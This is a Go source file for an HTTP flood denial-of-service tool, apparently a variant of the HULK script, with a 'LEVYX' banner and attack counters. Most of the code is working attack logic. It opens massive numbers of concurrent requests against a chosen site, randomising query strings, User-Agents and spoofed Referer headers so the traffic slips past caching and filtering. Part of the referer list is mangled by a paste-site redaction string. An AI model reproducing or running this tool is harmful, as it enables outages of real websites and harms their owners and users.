package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
)

const __version__  = "9.0.9"

// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk              uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

// global params
var (
	safe            bool     = false
	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		//"http://www.google.ru/?hl=ru&q=",
		//"http://yandex.ru/yandsearch?text=",
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 
		"https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", 
		"https://drive.google.com/viewerng/viewer?url=", 
		"http://www.google.com/translate?u=", 
		"https://developers.google.com/speed/pagespeed/insights/?url=", 
		"http://help.baidu.com/searchResult?keywords=", 
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 
		"http://www.google.com/?q=", 
		"http://regex.info/exif.cgi?url=", 
		"http://anonymouse.org/cgi-bin/anon-www.cgi/", 
		"http://www.google.com/translate?u=", 
		"http://translate.google.com/translate?u=", 
		"http://validator.w3.org/feed/check.cgi?url=", 
		"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", 
		"http://validator.w3.org/check?uri=", 
		"http://jigsaw.w3.org/css-validator/validator?uri=", 
		"http://validator.w3.org/checklink?uri=", 
		"http://www.w3.org/RDF/Validator/ARPServlet?URI=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", 
		"http://validator.w3.org/mobile/check?docAddr=", 
		"http://validator.w3.org/p3p/20020128/p3p.pl?uri=", 
		"http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
		"http://feedvalidator.org/check.cgi?url=", 
		"http://gmodules.com/ig/creator?url=", 
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=", 
		"http://www.onlinewebcheck.com/check.php?url=", 
		"http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", 
		"http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=", 
	    "http://host-tracker.com/check_page/?furl=",
        "http://jigsaw.w3.org/css-validator/validator?uri=",
        "http://www.google.com/translate?u=",
        "http://anonymouse.org/cgi-bin/anon-www.cgi/",
        "http://www.onlinewebcheck.com/?url=",
        "http://feedvalidator.org/check.cgi?url=",
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
        "http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=",
        "http://validator.w3.org/feed/check.cgi?url=",
        "http://www.pagescoring.com/website-speed-test/?url=",
        "http://check-host.net/check-http?host=",
        "http://checksite.us/?url=",
        "http://jobs.bloomberg.com/search?q=",
        "http://www.bing.com/search?q=",
        "https://www.yandex.com/yandsearch?text=",
        "http://www.google.com/?q=",
        "https://add.my.yahoo.com/rss?url=",
        "http://www.bestbuytheater.com/events/search?q=",
        "http://www.shodanhq.com/search?q=",
        "https://play.google.com/store/search?q=",
        "http://coccoc.com/search#query=",
        "https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=",
        "http://y...content-available-to-author-only...x.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..",
        "http://content-available-to-author-only.com/profile.php?redirect=",
        "http://w...content-available-to-author-only...y.com/search/results?q=",
        "http://y...content-available-to-author-only...x.ru/yandsearch?text=",
        "http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=",
        "http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..",
        "http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..",
        "http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..",
        "http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..",
        "http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..",
        "http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..",
        "http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..",
        "http://h...content-available-to-author-only...u.com/searchResult?keywords=",
        "http://w...content-available-to-author-only...g.com/search?q=",
        "https://w...content-available-to-author-only...x.com/yandsearch?text=",
        "https://d...content-available-to-author-only...o.com/?q=",
        "http://w...content-available-to-author-only...k.com/web?q=",
        "http://s...content-available-to-author-only...l.com/aol/search?q=",
        "https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=",
        "http://v...content-available-to-author-only...3.org/feed/check.cgi?url=",
        "http://h...content-available-to-author-only...r.com/check_page/?furl=",
        "http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=",
        "http://j...content-available-to-author-only...3.org/css-validator/validator?uri=",
        "https://a...content-available-to-author-only...o.com/rss?url=",
        "http://e...content-available-to-author-only...l.com/search?q=",
        "https://s...content-available-to-author-only...y.com/market/search?q=",
        "http://f...content-available-to-author-only...o.com/search?q=",
        "http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=",
        "http://e...content-available-to-author-only...e.net/wow/en/search?q=",
        "http://e...content-available-to-author-only...l.com/search?q=",
        "http://c...content-available-to-author-only...n.org/search?q=",
        "http://t...content-available-to-author-only...t.edu/search?q=",
        "http://w...content-available-to-author-only...m.tv/search?q=",
        "http://w...content-available-to-author-only...d.com/search?q=",
        "http://f...content-available-to-author-only...a.com/search?q=",
        "http://i...content-available-to-author-only...h.io/search?q=",
        "http://j...content-available-to-author-only...s.com/jobs/search?q=",
        "http://t...content-available-to-author-only...p.org/search?q=",
        "http://w...content-available-to-author-only...m.vn/news/vn/search&q=",
        "https://play.google.com/store/search?q=",
        "http://w...content-available-to-author-only...s.gov/@@tceq-search?q=",
        "http://w...content-available-to-author-only...t.com/search?q=",
        "http://w...content-available-to-author-only...r.com/events/search?q=",
        "https://c...content-available-to-author-only...e.org/search?q=",
        "http://j...content-available-to-author-only...s.com/search?q=",
        "http://j...content-available-to-author-only...g.com/search?q=",
        "https://w...content-available-to-author-only...t.com/search/?q=",
        "http://m...content-available-to-author-only...r.org/search?q=",
        "https://w...content-available-to-author-only...s.com/search?q=",
        "http://w...content-available-to-author-only...s.uk/search?q=",
        "http://w...content-available-to-author-only...q.com/search?q=",
        "http://www.search.com/search?q=",
        "https://add.my.yahoo.com/rss?url=",
        "https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=",
        "https://www.facebook.com/l.php?u=",
        "https://www.facebook.com/l.php?u=",
        "https://drive.google.com/viewerng/viewer?url=",
        "http://www.google.com/translate?u=",
        "http://downforeveryoneorjustme.com/",
        "http://www.slickvpn.com/go-dark/browse.php?u=",
        "https://www.megaproxy.com/go/_mp_framed?",
        "http://scanurl.net/?u=",
        "http://www.isup.me/",
        "http://check-host.net/check-tcp?host=",
        "http://check-host.net/check-dns?host=",
        "http://check-host.net/check-ping?host=",
        "http://www.currentlydown.com/",
        "http://check-host.net/check-ping?host=",
        "http://check-host.net/check-tcp?host=",
        "http://check-host.net/check-dns?host=",
        "http://check-host.net/ip-info?host=",
        "https://safeweb.norton.com/report/show?url=",
        "http://www.webproxy.net/view?q=",
        "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
        "https://anonysurfer.com/a2/index.php?q=",
        "http://analiz.web.tr/en/www/",
        "https://plus.google.com/share?url=",		
	}
	headersUseragents []string = []string{
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
		"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	}
	cur int32
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	var (
		version bool
		site    string
		agents  string
		data    string
		headers arrayFlags
	)

	flag.BoolVar(&version, "version", false, "print version and exit")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("TLSMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 17266166315252
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("err parsing url parameter\n")
		os.Exit(1)
	}

	if version {
		fmt.Println("TLS", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("can'l load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	go func() {
			
	
	
	
	
	
				fmt.Println("\u001B[31m			██▓    ▓█████ ██▒   █▓▓██   ██▓▒██   ██▒        ")
        fmt.Println("\u001B[31m			▓██▒    ▓█   ▀▓██░   █▒ ▒██  ██▒▒▒ █ █ ▒░        ")
        fmt.Println("\u001B[31m			▒██░    ▒███   ▓██  █▒░  ▒██ ██░░░  █   ░        ")
        fmt.Println("\u001B[31m			▒██░    ▒▓█  ▄  ▒██ █░░  ░ ▐██▓░ ░ █ █ ▒         ")
        fmt.Println("\u001B[31m			░██████▒░▒████▒  ▒▀█░    ░ ██▒▓░▒██▒ ▒██▒        ")
        fmt.Println("\u001B[31m			░ ▒░▓  ░░░ ▒░ ░  ░ ▐░     ██▒▒▒ ▒▒ ░ ░▓ ░        ")
        fmt.Println("\u001B[31m		   	░ ░ ▒  ░ ░ ░  ░  ░ ░░   ▓██ ░▒░ ░░   ░▒ ░        ")
        fmt.Println("\u001B[31m			     ░ ░      ░       ░░   ▒ ▒ ░░   ░    ░          ")
        fmt.Println("\u001B[31m			     ░  ░   ░  ░     ░   ░ ░      ░    ░          ")
        fmt.Println("\u001B[31m            			       ░    ░ ░                      ")
        fmt.Println("\u001B[31m		  ╠═════════════════════════════════════════════════════╣ ") 
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("\u001B[31mIn use               \u001B[31m║\t\u001B[35m║\tATTACK OK ║\tATTACK ERR")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("\r%6d %6d ║\t%6d ║\t%0d", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
				atomic.AddInt32(&cur, -1)
				err++
			case callExitOnTooManyFiles:
				atomic.AddInt32(&cur, -1)
				maxproc--
			case callGotOk:
				sent++
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d ║\t%7d ║\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r🚀HULK ATTACK FINISHED🚀     \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user -- TLS     \n")
}

func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	var param_joiner string
	var client = new(http.Client)

	if strings.ContainsRune(url, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	for {
		var q *http.Request
		var err error

		if data == "" {
			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		} else {
			q, err = http.NewRequest("POST", url, strings.NewReader(data))
		}

		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Charset", acceptCharset)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)

		// Overwrite headers with parameters

		for _, element := range headers {
			words := strings.Split(element, ":")
			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
		}

		r, e := client.Do(q)
		if e != nil {
			fmt.Fprintln(os.Stderr, e.Error())
			if strings.Contains(e.Error(), "socket: too many open files") {
				s <- callExitOnTooManyFiles
				return
			}
			s <- callExitOnErr
			return
		}
		r.Body.Close()
		s <- callGotOk
		if safe {
			if r.StatusCode >= 1 {
				s <- targetComplete
			}
		}
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}